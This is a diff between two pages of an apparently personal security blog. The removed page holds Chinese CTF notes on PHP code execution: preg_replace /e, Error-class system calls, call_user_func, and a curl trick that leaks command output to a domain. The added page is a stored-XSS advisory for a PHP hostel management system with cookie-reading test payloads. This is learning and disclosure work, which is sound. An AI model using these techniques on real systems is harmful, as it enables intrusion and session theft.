@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://asd1238525.github.io/2024/12/06/零碎知识/"/>
+  <link rel="canonical" href="http://asd1238525.github.io/2024/12/17/xss/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,21 +33,20 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>零碎知识 - Yunlin's Blog</title>
-  <meta name="keywords" content="CTF,null">
+  <title>xss - Yunlin's Blog</title>
+  <meta name="keywords" content="null">
   <meta desc name="description" content="分享技术知识，探讨编程问题，一起成长。 - John Doe - Yunlin's Blog">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="零碎知识">
-<meta property="og:url" content="http://asd1238525.github.io/2024/12/06/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/index.html">
+<meta property="og:title" content="xss">
+<meta property="og:url" content="http://asd1238525.github.io/2024/12/17/xss/index.html">
 <meta property="og:site_name" content="Yunlin&#39;s Blog">
-<meta property="og:description" content="正则表达式中的 &#x2F;e 修正符 &#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 $$(&lt;$&lt;)这行命令会尝试把 Flag 作为文件">
+<meta property="og:description" content="Hostel Management Systemsupplierhttps:&#x2F;&#x2F;code-projects.org&#x2F;hostel-management-site-using-php-source-code&#x2F; Vulnerability filebook-hostel.php  room-details.php describeThe book-hostel.php file contains an">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-12-06T11:00:43.000Z">
-<meta property="article:modified_time" content="2024-12-13T12:29:28.000Z">
+<meta property="article:published_time" content="2024-12-17T11:53:05.000Z">
+<meta property="article:modified_time" content="2024-12-17T11:53:46.000Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2818,7 +2817,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://asd1238525.github.io/2024/12/06/零碎知识/">
+  <link itemprop="mainEntityOfPage" href="http://asd1238525.github.io/2024/12/17/xss/">
   <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
     <meta itemprop="name" content="Yunlin's Blog">
   </span>
@@ -2839,7 +2838,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        零碎知识
+        xss
       </h1>
       <div class='new-meta-box'>
         
@@ -2856,29 +2855,15 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
-  
-  
-  
-  <div class='new-meta-item category'>
-    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/CTF/">CTF</a>
-    
-      <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-        <a href="/categories/CTF/" itemprop="url"><span itemprop="name">CTF</span></a>
-      </span>
-    
-  </div>
-  
-
 
 
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-12-06T19:00:43+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-12-17T19:53:05+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Dec 6, 2024</p>
+    <p>发布于：Dec 17, 2024</p>
   </a>
 </div>
 
@@ -2901,24 +2886,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h2 id="正则表达式中的-e-修正符"><a href="#正则表达式中的-e-修正符" class="headerlink" title="正则表达式中的 &#x2F;e 修正符"></a>正则表达式中的 &#x2F;e 修正符</h2><ol>
-<li>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。<br>提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</li>
-<li>$$(&lt;$&lt;)这行命令会尝试把 Flag 作为文件名进行文件读取，但是由于没有该文件所以会报错，而错误内容中存在 Flag。</li>
-<li>preg_replace(pattern, replacement, subject)</li>
-<li>&#x2F;(.*)&#x2F;e</li>
-</ol>
-<ul>
-<li>匹配任意字符（包括换行符）一次或多次，并捕获到一个数组中。  </li>
-<li>&#x2F;：正则表达式的开始和结束定界符。</li>
-<li>(.<em>)：这是一个捕获组，里面的 .</em> 表示匹配零个或多个任意字符（. 表示可以匹配任何单个字符，* 表示零个或多个）。</li>
-<li>&#x2F;e 修饰符表示替换字符串应该作为 PHP 代码来执行。这是一个已弃用且潜在危险的特性，因为它允许通过替换字符串执行代码。</li>
-</ul>
-<ol start="5">
-<li>Error::getMessage<br>例XYCTF的ezclass</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];  </span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];  </span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];  </span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];  </span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];  </span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    <h1 id="Hostel-Management-System"><a href="#Hostel-Management-System" class="headerlink" title="Hostel Management System"></a>Hostel Management System</h1><h2 id="supplier"><a href="#supplier" class="headerlink" title="supplier"></a>supplier</h2><p><a target="_blank" rel="noopener" href="https://code-projects.org/hostel-management-site-using-php-source-code/">https://code-projects.org/hostel-management-site-using-php-source-code/</a></p>
+<h2 id="Vulnerability-file"><a href="#Vulnerability-file" class="headerlink" title="Vulnerability file"></a>Vulnerability file</h2><p>book-hostel.php  room-details.php</p>
+<h2 id="describe"><a href="#describe" class="headerlink" title="describe"></a>describe</h2><p>The <code>book-hostel.php</code> file contains an unrestricted cross-site scripting (XSS) vulnerability, where all parameters can be passed into the <code>room-details.php</code> database, leading to a stored XSS attack. Malicious attackers can exploit this vulnerability to obtain sensitive information from the client side.</p>
+<h3 id="Code-analysis"><a href="#Code-analysis" class="headerlink" title="Code analysis"></a>Code analysis</h3><p>Line 7-40 in book-hostel.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$roomno</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;room&#x27;</span>];</span><br><span class="line"><span class="variable">$seater</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;seater&#x27;</span>];</span><br><span class="line"><span class="variable">$feespm</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fpm&#x27;</span>];</span><br><span class="line"><span class="variable">$foodstatus</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;foodstatus&#x27;</span>];</span><br><span class="line"><span class="variable">$stayfrom</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;stayf&#x27;</span>];</span><br><span class="line"><span class="variable">$duration</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;duration&#x27;</span>];</span><br><span class="line"><span class="variable">$course</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;course&#x27;</span>];</span><br><span class="line"><span class="variable">$regno</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;regno&#x27;</span>];</span><br><span class="line"><span class="variable">$fname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fname&#x27;</span>];</span><br><span class="line"><span class="variable">$mname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mname&#x27;</span>];</span><br><span class="line"><span class="variable">$lname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;lname&#x27;</span>];</span><br><span class="line"><span class="variable">$gender</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;gender&#x27;</span>];</span><br><span class="line"><span class="variable">$contactno</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contact&#x27;</span>];</span><br><span class="line"><span class="variable">$emailid</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$emcntno</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;econtact&#x27;</span>];</span><br><span class="line"><span class="variable">$gurname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;gname&#x27;</span>];</span><br><span class="line"><span class="variable">$gurrelation</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;grelation&#x27;</span>];</span><br><span class="line"><span class="variable">$gurcntno</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;gcontact&#x27;</span>];</span><br><span class="line"><span class="variable">$caddress</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>];</span><br><span class="line"><span class="variable">$ccity</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;city&#x27;</span>];</span><br><span class="line"><span class="variable">$cstate</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;state&#x27;</span>];</span><br><span class="line"><span class="variable">$cpincode</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pincode&#x27;</span>];</span><br><span class="line"><span class="variable">$paddress</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;paddress&#x27;</span>];</span><br><span class="line"><span class="variable">$pcity</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pcity&#x27;</span>];</span><br><span class="line"><span class="variable">$pstate</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pstate&#x27;</span>];</span><br><span class="line"><span class="variable">$ppincode</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ppincode&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;insert into  registration(roomno,seater,feespm,foodstatus,stayfrom,duration,course,regno,firstName,middleName,lastName,gender,contactno,emailid,egycontactno,guardianName,guardianRelation,guardianContactno,corresAddress,corresCIty,corresState,corresPincode,pmntAddress,pmntCity,pmnatetState,pmntPincode) values(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;iiiisisissssisississsisssi&#x27;</span>,<span class="variable">$roomno</span>,<span class="variable">$seater</span>,<span class="variable">$feespm</span>,<span class="variable">$foodstatus</span>,<span class="variable">$stayfrom</span>,<span class="variable">$duration</span>,<span class="variable">$course</span>,<span class="variable">$regno</span>,<span class="variable">$fname</span>,<span class="variable">$mname</span>,<span class="variable">$lname</span>,<span class="variable">$gender</span>,<span class="variable">$contactno</span>,<span class="variable">$emailid</span>,<span class="variable">$emcntno</span>,<span class="variable">$gurname</span>,<span class="variable">$gurrelation</span>,<span class="variable">$gurcntno</span>,<span class="variable">$caddress</span>,<span class="variable">$ccity</span>,<span class="variable">$cstate</span>,<span class="variable">$cpincode</span>,<span class="variable">$paddress</span>,<span class="variable">$pcity</span>,<span class="variable">$pstate</span>,<span class="variable">$ppincode</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;script&gt;alert(&#x27;Student Succssfully register&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>基本思路就是创建两个error类分别给system和cat &#x2F;flag两个参数，再用getMessage方法把输进去的参数当作字符串返回<br>6. curl <code>命令</code>.域名 直接访问域名，可以看到命令的执行结果。<br>7. call_user_func()<br>(call_user_func)(system,whoami,’’)即可执行whoami的命令<br>8. file_put_contents()伪协议读取文件内容<br>9. flag一般在目录文件里,env环境变量,或者在内存中<br>10. %00private属性<br>11. &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 日志文件</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>For pcity parameter, the test payload is <script>alert(1)</script><br>For paddress parameter, the test payload is <script>alert(document.cookie)</script><br>Visit this URL to trigger the cross-site scripting vulnerability.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8083/hostel/hostel/room-details.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="Rusult"><a href="#Rusult" class="headerlink" title="Rusult"></a>Rusult</h3><p>For parameter “pcity”:<br><img src="/image-1.png" class="lazyload" data-srcset="/image-1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="alt text"><br>For parameter “paddress”:<br><img src="/image-2.png" class="lazyload" data-srcset="/image-2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="alt text"></p>
 
   </div>
   
@@ -2943,10 +2920,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-12-13T20:29:28+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-12-17T19:53:46+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Dec 13, 2024</p>
+    <p>更新于：Dec 17, 2024</p>
   </a>
 </div>
 
@@ -2954,13 +2931,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         
           
-  
-  
-  
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div>
-  <span hidden itemprop="keywords">CTF</span>
-  
-
 
         
       
@@ -2972,7 +2942,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://asd1238525.github.io/2024/12/06/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/&title=零碎知识 - Yunlin's Blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://asd1238525.github.io/2024/12/17/xss/&title=xss - Yunlin's Blog&summary="
           
           >
           
@@ -2984,7 +2954,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://asd1238525.github.io/2024/12/06/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/&title=零碎知识 - Yunlin's Blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://asd1238525.github.io/2024/12/17/xss/&title=xss - Yunlin's Blog&summary="
           
           >
           
@@ -2996,7 +2966,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://asd1238525.github.io/2024/12/06/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/&title=零碎知识 - Yunlin's Blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://asd1238525.github.io/2024/12/17/xss/&title=xss - Yunlin's Blog&summary="
           
           >
           
@@ -3029,19 +2999,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2024/12/07/md5%E7%BB%95%E8%BF%87/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>md5绕过</p>
-          <p class='content'>1.弱相等
+      
+        <a class='next' href='/2024/12/15/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/'>
+          <p class='title'>路径穿越<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>基本判断
+有足够权限
+存在send_file等能下载文件的函数
+下载文件可控
 
-直接数组绕过
-常规0e绕过 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a
-这些字符串的 md...</p>
-        </a>
-      
-      
-        <a class='next' href='/2024/12/06/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/'>
-          <p class='title'>PHP伪协议<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>1.php:&#x2F;&#x2F;filter语法格式: php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;re...</p>
+flag路径获取
+查看题目的dockerfile看文件路径
+爆破或者其他路径获得
+
+WAF绕过
+..&#x2F;替...</p>
         </a>
       
     </div>
@@ -3060,7 +3031,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2024/12/06/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/12/17/xss/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -3102,7 +3073,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
   <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E7%9A%84-e-%E4%BF%AE%E6%AD%A3%E7%AC%A6"><span class="toc-text">正则表达式中的 &#x2F;e 修正符</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#supplier"><span class="toc-text">supplier</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-file"><span class="toc-text">Vulnerability file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#describe"><span class="toc-text">describe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-analysis"><span class="toc-text">Code analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rusult"><span class="toc-text">Rusult</span></a></li></ol></li></ol>
   </div>
 </section>
 
@@ -3596,7 +3567,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","sameAs":["https://github.com/volantis-x"],"description":"分享技术知识，探讨编程问题，一起成长。"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://asd1238525.github.io/","name":"Yunlin's Blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://asd1238525.github.io/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":3,"item":{"@id":"http://asd1238525.github.io/2024/12/06/零碎知识/","name":"零碎知识"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","keywords":null,"description":"分享技术知识，探讨编程问题，一起成长。","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","description":"分享技术知识，探讨编程问题，一起成长。"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://asd1238525.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"零碎知识","description":"分享技术知识，探讨编程问题，一起成长。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://asd1238525.github.io/2024/12/06/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://asd1238525.github.io/2024/12/06/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/","wordCount":0,"datePublished":"2024-12-06T11:00:43.000Z","dateModified":"2024-12-13T12:29:28.000Z","articleSection":"CTF","keywords":"CTF","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","sameAs":["https://github.com/volantis-x"],"description":"分享技术知识，探讨编程问题，一起成长。"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://asd1238525.github.io/","name":"Yunlin's Blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://asd1238525.github.io/2024/12/17/xss/","name":"xss"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","keywords":null,"description":"分享技术知识，探讨编程问题，一起成长。","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","description":"分享技术知识，探讨编程问题，一起成长。"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://asd1238525.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"xss","description":"分享技术知识，探讨编程问题，一起成长。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://asd1238525.github.io/2024/12/17/xss/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://asd1238525.github.io/2024/12/17/xss/","wordCount":0,"datePublished":"2024-12-17T11:53:05.000Z","dateModified":"2024-12-17T11:53:46.000Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
